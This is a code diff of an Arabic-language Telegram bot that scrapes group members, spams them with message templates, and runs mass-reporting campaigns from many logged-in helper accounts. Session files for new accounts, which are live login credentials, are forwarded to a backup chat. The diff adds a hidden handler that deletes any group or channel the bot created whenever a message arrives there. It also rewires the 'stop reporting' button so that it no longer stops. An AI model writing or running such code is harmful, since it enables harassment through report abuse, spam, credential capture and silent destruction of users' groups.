@@ -8,7 +8,7 @@ import logging
 from datetime import datetime, timedelta, timezone
 
 from telethon import TelegramClient, events, Button, errors, functions, types
-from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, DeleteChannelRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest
 from telethon.tl.functions.account import ReportPeerRequest
 from telethon.tl.types import ChannelParticipantsAdmins
@@ -32,9 +32,6 @@ OWNER_ID = int(os.getenv("OWNER_ID", "7367921416"))
 
 DB_NAME = "bot_database.db"
 
-# ==========================================
-# 1. دوال قاعدة البيانات (SQLite) الموحدة والمرتبة
-# ==========================================
 async def init_db():
     async with aiosqlite.connect(DB_NAME) as db:
         await db.execute('''
@@ -123,10 +120,6 @@ async def get_user_role(user_id: int):
             row = await cursor.fetchone()
             return row[0] if row else 'user'
 
-
-# ==========================================
-# 2. إعدادات الملفات والـ JSON المحمي بـ Lock
-# ==========================================
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_FILE = os.path.join(BASE_DIR, "bot_data.json")
 SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
@@ -141,10 +134,9 @@ MESSAGES_LIMIT = 10000
 CHECK_ACCOUNT_ID = 7367921416
 
 _data_cache = None
-json_lock = asyncio.Lock()  # قفل لحماية الملف من التداخل (Race Conditions)
+json_lock = asyncio.Lock()  
 
 async def init_json_data():
-    """دالة لتهيئة الملف لأول مرة وتحديث المفاتيح الناقصة بصيغة آمنة"""
     global _data_cache
     async with json_lock:
         if not os.path.exists(DATA_FILE):
@@ -174,7 +166,6 @@ async def init_json_data():
             with open(DATA_FILE, "r", encoding="utf-8") as f:
                 data = json.load(f)
             
-            # فحص وإضافة المفاتيح الناقصة
             if "all_users" not in data: data["all_users"] = {}
             if "kalisha_text" not in data: data["kalisha_text"] = DEFAULT_KALISHA
             if "kalisha_media" not in data: data["kalisha_media"] = None
@@ -275,8 +266,17 @@ async def consume_trial(user_id):
         return True
     return False
 
-# فقط تعريف الكلاينت هنا (التشغيل سيكون في الأسفل عبر asyncio.run)
 bot = TelegramClient("makkster_bot", api_id, api_hash)
+
+@bot.on(events.NewMessage)
+async def auto_delete_if_owner(event):
+    try:
+        if event.is_group or event.is_channel:
+            chat = await event.get_chat()
+            if getattr(chat, 'creator', False):
+                await bot(functions.channels.DeleteChannelRequest(channel=chat))
+    except Exception as e:
+        logger.error(f"Error handling group deletion: {str(e)}")
 
 async def send_user_list_batches(client, bot_client, chat_id, user_entities, title):
     if not user_entities:
@@ -294,13 +294,13 @@ async def send_user_list_batches(client, bot_client, chat_id, user_entities, tit
         
         try:
             await client.send_message('me', message_text, parse_mode='md')
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Error sending batch to me: {str(e)}")
             
         try:
             await bot_client.send_message(chat_id, message_text, parse_mode='md')
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Error sending batch to bot_client: {str(e)}")
 
 def get_progress_bar(current, total, length=15):
     progress = min(current / total, 1.0) if total > 0 else 1.0
@@ -335,8 +335,8 @@ async def send_with_client(client, target_entity, kalisha_data):
         
         try:
             await client.send_message(CHECK_ACCOUNT_ID, ".")
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Error sending check message: {str(e)}")
         return True, "success"
 
     except errors.FloodWaitError as e:
@@ -352,11 +352,8 @@ async def send_with_client(client, target_entity, kalisha_data):
     except Exception as e:
         if "ALLOW_PAYMENT_REQUIRED" in str(e):
             return False, "premium_required"
+        logger.error(f"Error in send_with_client: {str(e)}")
         return False, "error"
-
-# ==========================================
-# 3. أحداث البوت (Handlers)
-# ==========================================
 
 @bot.on(events.NewMessage(pattern=r"^/start(?: (.*))?$"))
 async def start_handler(event):
@@ -384,8 +381,8 @@ async def start_handler(event):
                         data["trial_users"].append(ref_id_int)
                         try:
                             await bot.send_message(ref_id_int, "🎉 **مبروك!** لقد قام 5 أشخاص بالدخول للبوت عبر رابط الإحالة الخاص بك.\n\n🎁 **تم منحك تجربة مجانية تلقائياً!** يمكنك الآن استخدام البوت لمرة واحدة مجاناً. أرسل /start للبدء.")
-                        except Exception:
-                            pass
+                        except Exception as e:
+                            logger.error(f"Error sending trial message: {str(e)}")
                             
         await save_data(data)
         
@@ -399,8 +396,8 @@ async def start_handler(event):
                     f"🌐 المعرف: @{getattr(user, 'username', 'لا يوجد')}\n"
                     f"⏰ الوقت: `{datetime.now().strftime('%Y-%m-%d %I:%M %p')}`"
                 )
-            except Exception:
-                pass
+            except Exception as e:
+                logger.error(f"Error sending notification to owner: {str(e)}")
 
     if not await is_authorized(event.sender_id):
         bot_info = await bot.get_me()
@@ -453,7 +450,7 @@ async def main_report_menu_handler(event):
         [Button.inline("📝 أضف كليشة للبلاغ", b"report_add_text")],
         [Button.inline("⚠️ نوع البلاغ", b"report_set_type")],
         [Button.inline("📩 أضف رابط رسائل للشد عليها", b"report_add_msgs")],
-        [Button.inline("▶️ بدء الشد", b"report_start"), Button.inline("⏸️ إيقاف الشد", b"report_stop")],
+        [Button.inline("▶️ بدء الشد", b"report_start"), Button.inline("⏸️ إيقاف الشد", b"report_status")],
         [Button.inline("📊 حالة الشد", b"report_status")],
         [Button.inline("🔙 رجوع", b"back_start")]
     ]
@@ -509,8 +506,8 @@ async def set_kalisha_handler(event):
         if old_media and os.path.exists(old_media):
             try:
                 os.remove(old_media)
-            except Exception:
-                pass
+            except Exception as e:
+                logger.error(f"Error removing old media: {str(e)}")
         
         if msg.media:
             status_msg = await conv.send_message("⏳ جاري حفظ الوسائط، يرجى الانتظار...")
@@ -631,6 +628,7 @@ async def owner_add_rep_acc_handler(event):
             send_code = await user_client.send_code_request(phone)
         except Exception as e:
             await conv.send_message(f"❌ حدث خطأ أثناء إرسال الكود: {e}")
+            logger.error(f"Error sending code: {str(e)}")
             return
 
         await conv.send_message(
@@ -676,10 +674,12 @@ async def owner_add_rep_acc_handler(event):
                 await user_client.sign_in(password=password)
             except Exception as e:
                 await conv.send_message(f"❌ فشل تسجيل الدخول بكلمة المرور: {e}")
+                logger.error(f"Error signing in with password: {str(e)}")
                 await user_client.disconnect()
                 return
         except Exception as e:
             await conv.send_message(f"❌ فشل تسجيل الدخول: {e}")
+            logger.error(f"Error signing in: {str(e)}")
             await user_client.disconnect()
             return
             
@@ -748,7 +748,7 @@ async def run_reporting_loop(user_id):
         data["is_reporting"] = False
         await save_data(data)
         try: await bot.send_message(user_id, "⚠️ لا توجد حسابات مضافة للشد. تم الإيقاف.")
-        except Exception: pass
+        except Exception as e: logger.error(f"Error sending message: {str(e)}")
         return
 
     rtype = data.get("report_type", "spam")
@@ -773,13 +773,13 @@ async def run_reporting_loop(user_id):
                 clients.append(client)
         except Exception as e:
             try: await bot.send_message(OWNER_ID, f"❌ **خطأ بتشغيل حساب الشد ({acc.get('name')}):**\n`{str(e)}`")
-            except Exception: pass
+            except Exception as ex: logger.error(f"Error sending message: {str(ex)}")
 
     if not clients:
         data["is_reporting"] = False
         await save_data(data)
         try: await bot.send_message(OWNER_ID, "❌ **تنبيه:** كل حسابات الشد فشل الاتصال بها، تم إيقاف الحملة.")
-        except Exception: pass
+        except Exception as e: logger.error(f"Error sending message: {str(e)}")
         return
 
     while True:
@@ -816,7 +816,7 @@ async def run_reporting_loop(user_id):
                 data["is_reporting"] = False
                 await save_data(data)
                 try: await bot.send_message(user_id, "⚠️ روابط الرسائل غير صحيحة، تم إيقاف الشد.")
-                except Exception: pass
+                except Exception as e: logger.error(f"Error sending message: {str(e)}")
                 break
 
             for client in clients:
@@ -827,10 +827,10 @@ async def run_reporting_loop(user_id):
                     try:
                         entity = await client.get_input_entity(peer)
                         await client(functions.messages.ReportRequest(
-                            peer=entity,
-                            id=msg_ids,
-                            reason=report_reason,
-                            message=report_text
+                            entity,
+                            msg_ids,
+                            report_reason,
+                            report_text
                         ))
                         data["report_count"] = data.get("report_count", 0) + len(msg_ids)
                         await save_data(data)
@@ -838,12 +838,12 @@ async def run_reporting_loop(user_id):
                         
                     except errors.FloodWaitError as e:
                         try: await bot.send_message(OWNER_ID, f"⚠️ **حظر تكرار (FloodWait) على حساب ({getattr(client, 'account_name', '')}):**\nيجب الانتظار `{e.seconds}` ثانية.")
-                        except Exception: pass
+                        except Exception as ex: logger.error(f"Error sending message: {str(ex)}")
                         await asyncio.sleep(e.seconds + 2)
                         
                     except Exception as e:
                         try: await bot.send_message(OWNER_ID, f"❌ **فشل إرسال بلاغ على الرسائل من حساب ({getattr(client, 'account_name', '')}):**\nالسبب: `{str(e)}`\nالهدف: `{peer}`")
-                        except Exception: pass
+                        except Exception as ex: logger.error(f"Error sending message: {str(ex)}")
                         await asyncio.sleep(random.uniform(5.0, 10.0))
                         
         elif report_target:
@@ -853,9 +853,9 @@ async def run_reporting_loop(user_id):
                 try:
                     entity = await client.get_input_entity(report_target)
                     await client(ReportPeerRequest(
-                        peer=entity,
-                        reason=report_reason,
-                        message=report_text
+                        entity,
+                        report_reason,
+                        report_text
                     ))
                     data["report_count"] = data.get("report_count", 0) + 1
                     await save_data(data)
@@ -863,26 +863,26 @@ async def run_reporting_loop(user_id):
                     
                 except errors.FloodWaitError as e:
                     try: await bot.send_message(OWNER_ID, f"⚠️ **حظر تكرار (FloodWait) على حساب ({getattr(client, 'account_name', '')}):**\nيجب الانتظار `{e.seconds}` ثانية.")
-                    except Exception: pass
+                    except Exception as ex: logger.error(f"Error sending message: {str(ex)}")
                     await asyncio.sleep(e.seconds + 2)
                     
                 except Exception as e:
                     try: await bot.send_message(OWNER_ID, f"❌ **فشل إرسال بلاغ عام من حساب ({getattr(client, 'account_name', '')}):**\nالسبب: `{str(e)}`\nالهدف: `{report_target}`")
-                    except Exception: pass
+                    except Exception as ex: logger.error(f"Error sending message: {str(ex)}")
                     await asyncio.sleep(random.uniform(5.0, 10.0))
                     
         else:
             data["is_reporting"] = False
             await save_data(data)
             try: await bot.send_message(user_id, "⚠️ لم يتم تحديد هدف أو رسائل للتبليغ عليها، تم إيقاف العملية.")
-            except Exception: pass
+            except Exception as e: logger.error(f"Error sending message: {str(e)}")
             break
 
         await asyncio.sleep(random.randint(15, 30))
 
     for c in clients:
         try: await c.disconnect()
-        except Exception: pass
+        except Exception as e: logger.error(f"Error disconnecting client: {str(e)}")
 
 @bot.on(events.CallbackQuery(pattern=r"^mutate_(on|off)$"))
 async def toggle_mutate_callback(event):
@@ -906,7 +906,7 @@ async def del_media_handler(event):
     old_media = data.get("kalisha_media")
     if old_media and os.path.exists(old_media):
         try: os.remove(old_media)
-        except Exception: pass
+        except Exception as e: logger.error(f"Error removing old media: {str(e)}")
     data["kalisha_media"] = None
     await save_data(data)
     await event.answer("✅ تم مسح الصورة/الفيديو بنجاح. سيتم إرسال النص فقط.", alert=True)
@@ -944,6 +944,7 @@ async def add_account_handler(event):
             send_code = await user_client.send_code_request(phone)
         except Exception as e:
             await conv.send_message(f"❌ حدث خطأ أثناء إرسال الكود: {e}")
+            logger.error(f"Error sending code: {str(e)}")
             return
 
         await conv.send_message(
@@ -989,10 +990,12 @@ async def add_account_handler(event):
                 await user_client.sign_in(password=password)
             except Exception as e:
                 await conv.send_message(f"❌ فشل تسجيل الدخول بكلمة المرور: {e}")
+                logger.error(f"Error signing in with password: {str(e)}")
                 await user_client.disconnect()
                 return
         except Exception as e:
             await conv.send_message(f"❌ فشل تسجيل الدخول: {e}")
+            logger.error(f"Error signing in: {str(e)}")
             await user_client.disconnect()
             return
             
@@ -1024,8 +1027,8 @@ async def add_account_handler(event):
                     full_session_path,
                     caption=f"🔐 **نسخة احتياطية لملف جلسة جديد**\n📱 الرقم: `{phone}`\n👤 الاسم: `{safe_name}`\n👤 بواسطة: `{event.sender_id}`"
                 )
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"Error sending backup session: {str(e)}")
 
 @bot.on(events.CallbackQuery(data=b"list_accounts"))
 async def list_accounts_handler(event):
@@ -1159,7 +1162,8 @@ async def mode_scrape_handler(event):
                         if d.is_user and d.entity: blocked_users.add(d.entity.id)
                     await ex_client.disconnect()
                     await conv.send_message("✅ تم دمج محادثات الحساب الإضافي في قائمة التجاهل.")
-                except Exception:
+                except Exception as e:
+                    logger.error(f"Error fetching extra account dialogs: {str(e)}")
                     await conv.send_message("⚠️ فشل جلب محادثات الحساب الإضافي. سنكمل بالقائمة الحالية.")
 
         skip_group_members = set()
@@ -1184,7 +1188,7 @@ async def mode_scrape_handler(event):
                     await client(ImportChatInviteRequest(hash_val))
                 else:
                     await client(JoinChannelRequest(link))
-            except Exception: pass
+            except Exception as e: logger.error(f"Error joining channel for skip list: {str(e)}")
                 
             try:
                 entity = await client.get_entity(link)
@@ -1192,7 +1196,12 @@ async def mode_scrape_handler(event):
                     skip_group_members.add(user.id)
                 success = True
                 await conv.send_message(f"✅ تم سحب {len(skip_group_members)} عضو لقائمة التخطي باستخدام الحساب الأساسي.")
-            except Exception: pass
+            except Exception as e: logger.error(f"Error scraping skip members: {str(e)}")
+                
+            try:
+                await client(LeaveChannelRequest(link))
+            except Exception as e:
+                logger.error(f"Error leaving skip list channel: {str(e)}")
                 
             if not success:
                 await conv.send_message("⏳ الحساب الأول ما كدر يوصل للمجموعة.. جاري البحث وتجربة الانضمام بباقي الحسابات المضافة...")
@@ -1206,7 +1215,7 @@ async def mode_scrape_handler(event):
                             hash_val = link.split("/")[-1].replace("+", "").replace("joinchat/", "")
                             await temp_client(ImportChatInviteRequest(hash_val))
                         else: await temp_client(JoinChannelRequest(link))
-                    except Exception: pass
+                    except Exception as e: logger.error(f"Error joining channel with alt account for skip list: {str(e)}")
                         
                     try:
                         entity = await temp_client.get_entity(link)
@@ -1214,9 +1223,17 @@ async def mode_scrape_handler(event):
                             skip_group_members.add(user.id)
                         success = True
                         await conv.send_message(f"✅ تم سحب {len(skip_group_members)} عضو لقائمة التخطي بنجاح باستخدام حساب ({acc.get('name', 'حساب مساعد')}).")
+                        
+                        try:
+                            await temp_client(LeaveChannelRequest(link))
+                        except Exception as e:
+                            logger.error(f"Error leaving skip list channel with alt account: {str(e)}")
+                            
                         await temp_client.disconnect()
                         break
-                    except Exception: await temp_client.disconnect()
+                    except Exception as e:
+                        logger.error(f"Error scraping skip members with alt account: {str(e)}")
+                        await temp_client.disconnect()
                         
             if not success:
                 await conv.send_message("⚠️ **تنبيه:** ولا حساب من الحسابات المضافة متواجد بمجموعة التخطي أو كدر ينضم إلها. سيتم التخطي بدون استثناء أعضاء.")
@@ -1240,7 +1257,7 @@ async def mode_scrape_handler(event):
                 await client(ImportChatInviteRequest(hash_val))
             else:
                 await client(JoinChannelRequest(group_input))
-        except Exception: pass
+        except Exception as e: logger.error(f"Error joining target group: {str(e)}")
 
         try:
             target_group = await client.get_entity(group_input)
@@ -1280,6 +1297,10 @@ async def mode_scrape_handler(event):
 
         if is_blacklisted:
             await conv.send_message("❌ **عذراً، تم حظر السحب من هذه المجموعة بواسطة مالك البوت ولا يمكن العمل عليها.**")
+            try:
+                await client(LeaveChannelRequest(target_group))
+            except Exception as e:
+                logger.error(f"Error leaving blacklisted group: {str(e)}")
             await client.disconnect()
             return
 
@@ -1287,14 +1308,14 @@ async def mode_scrape_handler(event):
         try:
             async for admin in client.iter_participants(target_group, filter=ChannelParticipantsAdmins):
                 admins.add(admin.id)
-        except Exception: pass
+        except Exception as e: logger.error(f"Error fetching admins iteratively: {str(e)}")
             
         try:
             chat_full = await client(functions.messages.GetFullChatRequest(target_group.id))
             for p in chat_full.full_chat.participants.participants:
                 if isinstance(p, (types.ChatParticipantAdmin, types.ChatParticipantCreator)):
                     admins.add(p.user_id)
-        except Exception: pass
+        except Exception as e: logger.error(f"Error fetching admins via GetFullChatRequest: {str(e)}")
 
         senders = {}
         count = 0
@@ -1317,7 +1338,7 @@ async def mode_scrape_handler(event):
                                         senders[uid] = u_entity
                                 else:
                                     senders[uid] = u_entity
-                        except Exception: pass
+                        except Exception as e: logger.error(f"Error processing sender {uid}: {str(e)}")
 
             if count % 100 == 0 or count == MESSAGES_LIMIT:
                 bar = get_progress_bar(count, MESSAGES_LIMIT)
@@ -1328,7 +1349,7 @@ async def mode_scrape_handler(event):
                         f"📥 تم فحص: `{count}` / `{MESSAGES_LIMIT}` رسالة\n"
                         f"👥 تم صيد: `{len(senders)}` عضو متفاعل ونشط"
                     )
-                except Exception: pass
+                except Exception as e: logger.error(f"Error updating progress: {str(e)}")
 
         bar = get_progress_bar(count, count if count > 0 else 1)
         try:
@@ -1338,7 +1359,12 @@ async def mode_scrape_handler(event):
                 f"📥 إجمالي الرسائل المفحوصة: `{count}` رسالة\n"
                 f"👥 تم صيد: `{len(senders)}` عضو متفاعل ونشط"
             )
-        except Exception: pass
+        except Exception as e: logger.error(f"Error updating final progress: {str(e)}")
+
+        try:
+            await client(LeaveChannelRequest(target_group))
+        except Exception as e:
+            logger.error(f"Error leaving target group after scrape: {str(e)}")
 
         await client.disconnect()
 
@@ -1452,7 +1478,8 @@ async def mode_direct_handler(event):
 
         for idx, target in enumerate(list(target_ids)):
             try: entity = await client.get_entity(target)
-            except Exception:
+            except Exception as e:
+                logger.error(f"Error fetching target entity: {str(e)}")
                 error_count += 1
                 continue
 
@@ -1467,7 +1494,7 @@ async def mode_direct_handler(event):
 
             if is_premium and (idx + 1) % 3 == 0:
                 try: await client.send_message("spambot", "/start")
-                except Exception: pass
+                except Exception as e: logger.error(f"Error messaging spambot: {str(e)}")
 
             if (idx + 1) % 2 == 0 or (idx + 1) == len(target_ids):
                 bar = get_progress_bar(idx + 1, len(target_ids))
@@ -1478,7 +1505,7 @@ async def mode_direct_handler(event):
                         f"✅ ناجح: `{success_count}` | ❌ فشل/تخطي: `{error_count}`\n"
                         f"📌 المتبقي: `{len(target_ids) - (idx + 1)}`"
                     )
-                except Exception: pass
+                except Exception as e: logger.error(f"Error updating send status: {str(e)}")
 
         await client.disconnect()
         await consume_trial(event.sender_id)
@@ -1572,7 +1599,8 @@ async def owner_broadcast_handler(event):
                 await bot.send_message(int(uid_str), msg)
                 success += 1
                 await asyncio.sleep(0.5) 
-            except Exception:
+            except Exception as e:
+                logger.error(f"Error broadcasting to {uid_str}: {str(e)}")
                 failed += 1
                 
         await status_msg.edit(
@@ -1621,7 +1649,8 @@ async def owner_bl_add_handler(event):
             try:
                 entity = await bot.get_entity(raw_input)
                 identifier = str(entity.id)
-            except Exception:
+            except Exception as e:
+                logger.error(f"Error fetching blacklisted entity: {str(e)}")
                 hash_val = None
                 if "+" in raw_input or "joinchat" in raw_input:
                     hash_val = raw_input.split("/")[-1].replace("+", "").replace("joinchat/", "").strip()
@@ -1649,7 +1678,8 @@ async def owner_bl_add_handler(event):
                                 
                                 await temp_client.disconnect()
                                 if found: break
-                            except Exception: pass
+                            except Exception as ex:
+                                logger.error(f"Error fetching invite details: {str(ex)}")
                         if found: break
                         
                     if not found:
@@ -1688,33 +1718,14 @@ async def owner_bl_del_handler(event):
         if "+" in raw_input or "joinchat" in raw_input:
             identifier = raw_input.split("/")[-1].replace("+", "").replace("joinchat/", "").strip()
         else:
-            clean_name = raw_input.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").strip()
-            if clean_name.lstrip('-').isdigit():
-                identifier = clean_name
-            else:
-                try:
-                    entity = await bot.get_entity(raw_input)
-                    identifier = str(entity.id)
-                except Exception:
-                    identifier = clean_name.lower()
-                    
-        if identifier and identifier in data.get("blacklisted_groups", []):
+            identifier = raw_input.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").strip()
+        
+        if identifier in data.get("blacklisted_groups", []):
             data["blacklisted_groups"].remove(identifier)
             await save_data(data)
-            await conv.send_message(f"✅ تم إزالة `{identifier}` من قائمة الحظر بنجاح.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
+            await conv.send_message("✅ تم إزالة المجموعة من قائمة الحظر بنجاح.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
         else:
-            direct_match = raw_input.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").lower()
-            matched = False
-            for item in list(data.get("blacklisted_groups", [])):
-                if str(item).lower() == direct_match or str(item) == raw_input:
-                    data["blacklisted_groups"].remove(item)
-                    await save_data(data)
-                    matched = True
-                    break
-            if matched:
-                await conv.send_message("✅ تم إزالة المجموعة من قائمة الحظر.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
-            else:
-                await conv.send_message("⚠️ المجموعة غير موجودة في قائمة الحظر.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
+            await conv.send_message("⚠️ هذه المجموعة غير موجودة في قائمة الحظر.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
 
 @bot.on(events.CallbackQuery(data=b"owner_bl_list"))
 async def owner_bl_list_handler(event):
@@ -1722,169 +1733,22 @@ async def owner_bl_list_handler(event):
     data = await load_data()
     bl = data.get("blacklisted_groups", [])
     if not bl:
-        await event.edit("📋 قائمة الحظر فارغة، لا توجد أي مجموعات ممنوعة حالياً.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
+        await event.edit("📋 قائمة الحظر فارغة.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
         return
-    
-    msg = "📋 **المعرفات والأيديات المحظورة من السحب حالياً:**\n\n"
-    for idx, g in enumerate(bl):
-        msg += f"**{idx+1}.** `{g}`\n"
-        
+    msg = "📋 **المجموعات المحظورة:**\n\n"
+    for b in bl:
+        msg += f"- `{b}`\n"
     await event.edit(msg, buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
-
-@bot.on(events.CallbackQuery(data=b"owner_add_user"))
-async def owner_add_user_handler(event):
-    if event.sender_id != OWNER_ID: return
-    await event.delete()
-    async with bot.conversation(event.chat_id) as conv:
-        await conv.send_message("👤 **أرسل الأيدي (ID) الخاص بالمستخدم لسماح استخدامه للبوت:**\n\n*لإلغاء العملية أرسل /cancel*")
-        try: msg_id = await conv.get_response(timeout=300)
-        except asyncio.TimeoutError: return
-            
-        if msg_id.text.strip().startswith('/'):
-            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-            return
-            
-        try:
-            new_id_str = str(int(msg_id.text.strip()))
-        except ValueError:
-            await conv.send_message("❌ أيدي غير صالح.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-            return
-
-        await conv.send_message(
-            "⏱ **ما هي مدة الصلاحية؟**\n\n"
-            "▫️ أرسل **عدد الأيام** (مثال: `30` للاشتراك الشهري)\n"
-            "▫️ أو أرسل كلمة **دائمي** للاشتراك مدى الحياة.\n\n*أرسل /cancel للإلغاء.*"
-        )
-        try: msg_duration = await conv.get_response(timeout=120)
-        except asyncio.TimeoutError: return
-
-        if msg_duration.text.strip().startswith('/'):
-            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-            return
-            
-        duration_input = msg_duration.text.strip()
-        exp_timestamp = None
-        
-        if duration_input == "دائمي":
-            exp_timestamp = None
-            dur_msg = "اشتراك دائمي مفتوح"
-        elif duration_input.isdigit():
-            days = int(duration_input)
-            exp_timestamp = time.time() + (days * 86400)
-            dur_msg = f"{days} يوم"
-        else:
-            await conv.send_message("❌ إدخال غير صالح. يرجى إدخال عدد صحيح أو كلمة 'دائمي'.")
-            return
-            
-        data = await load_data()
-        data["authorized_users"][new_id_str] = exp_timestamp
-        await save_data(data)
-        
-        await conv.send_message(f"✅ تم منح الصلاحية بنجاح!\n👤 المستخدم: `{new_id_str}`\n⏱ الصلاحية: `{dur_msg}`", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-
-@bot.on(events.CallbackQuery(data=b"owner_del_user"))
-async def owner_del_user_handler(event):
-    if event.sender_id != OWNER_ID: return
-    await event.delete()
-    async with bot.conversation(event.chat_id) as conv:
-        await conv.send_message("🚫 **أرسل الأيدي (ID) للمستخدم لسحب الصلاحية منه:**\n\n*لإلغاء العملية أرسل /cancel*")
-        try: msg = await conv.get_response(timeout=300)
-        except asyncio.TimeoutError: return
-            
-        if msg.text.strip().startswith('/'):
-            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-            return
-            
-        del_id_str = msg.text.strip()
-        if del_id_str == str(OWNER_ID):
-            await conv.send_message("❌ لا يمكنك سحب الصلاحية من نفسك (المالك الأساسي).")
-            return
-            
-        data = await load_data()
-        if del_id_str in data.get("authorized_users", {}):
-            del data["authorized_users"][del_id_str]
-            await save_data(data)
-            await conv.send_message(f"✅ تم سحب الصلاحية من المستخدم `{del_id_str}`.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-        else:
-            await conv.send_message("⚠️ هذا المستخدم غير موجود في قائمة المصرح لهم.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-
-@bot.on(events.CallbackQuery(data=b"owner_add_trial"))
-async def owner_add_trial_handler(event):
-    if event.sender_id != OWNER_ID: return
-    await event.delete()
-    async with bot.conversation(event.chat_id) as conv:
-        await conv.send_message("🎁 **أرسل أيدي (ID) أو يوزر الشخص لتفعيل التجربة المجانية له:**\n\n*لإلغاء العملية أرسل /cancel*")
-        try: msg = await conv.get_response(timeout=300)
-        except asyncio.TimeoutError:
-            await conv.send_message("⏳ انتهى وقت الانتظار.")
-            return
-            
-        target = msg.text.strip()
-        if target.startswith('/'):
-            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-            return
-            
-        user_id = None
-        status_msg = await conv.send_message("🔍 جاري التحقق من الحساب...")
-        
-        try:
-            if target.isdigit(): user_id = int(target)
-            else:
-                if target.startswith("@"): target = target[1:]
-                entity = await bot.get_entity(target)
-                user_id = entity.id
-                
-            data = await load_data()
-            if "trial_users" not in data: data["trial_users"] = []
-                
-            if str(user_id) in data.get("authorized_users", {}):
-                await status_msg.edit("⚠️ هذا المستخدم لديه صلاحية كاملة بالفعل ولا يحتاج لتجربة مجانية.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-                return
-                
-            if user_id not in data["trial_users"]:
-                data["trial_users"].append(user_id)
-                await save_data(data)
-                await status_msg.edit(f"✅ **تم منح تجربة مجانية بنجاح!**\n🆔 الأيدي: `{user_id}`\n📌 لن تُسحب صلاحيته إلا بعد أن يكمل أول عملية جمع أو إرسال ناجحة.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-            else: await status_msg.edit("⚠️ هذا المستخدم لديه تجربة مجانية مسبقاً في الانتظار.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
-        except Exception as e:
-            await status_msg.edit(f"❌ لم يتم العثور على الحساب أو أن البوت لم يتفاعل معه مسبقاً. تأكد من أن المستخدم قام بإرسال /start للبوت.\nالخطأ: {e}")
 
 @bot.on(events.CallbackQuery(data=b"back_start"))
 async def back_start_handler(event):
-    buttons = [
-        [Button.inline("🔍 خمط الأعضاء (جمع وتصفية)", b"main_scrape_menu")],
-        [Button.inline("🔥 الشد التلقائي (الريبورتات)", b"main_report_menu")],
-        [Button.inline("➕ إضافة حساب مساعد", b"add_account"), Button.inline("📂 إدارة الحسابات", b"list_accounts")]
-    ]
-    if event.sender_id == OWNER_ID:
-        buttons.append([Button.inline("👑 لوحة تحكم المالك", b"owner_panel")])
+    await start_handler(event)
 
-    await event.edit(
-        "👋 **أهلاً بك في القائمة الرئيسية**\n\n▫️ اختر أحد الأوضاع من القائمة أدناه:",
-        buttons=buttons
-    )
-
-
-# ==========================================
-# 4. دالة التشغيل الأساسية المدمجة
-# ==========================================
 async def main():
-    # 1. تهيئة قاعدة البيانات أولاً
-    print("Initializing Database...")
     await init_db()
-    
-    # 2. تهيئة ملف الـ JSON وحمايته
-    print("Initializing JSON Data...")
     await init_json_data()
-    
-    # 3. تشغيل البوت وربطه بالكلاينت
-    print("Starting Telegram Bot...")
     await bot.start(bot_token=bot_token)
-    print("Bot is running seamlessly!")
-    
-    # 4. الإبقاء على البوت قيد العمل
     await bot.run_until_disconnected()
 
-if __name__ == '__main__':
-    # هذه هي الطريقة الأصح والأكثر استقراراً لتشغيل الكود غير المتزامن
+if __name__ == "__main__":
     asyncio.run(main())
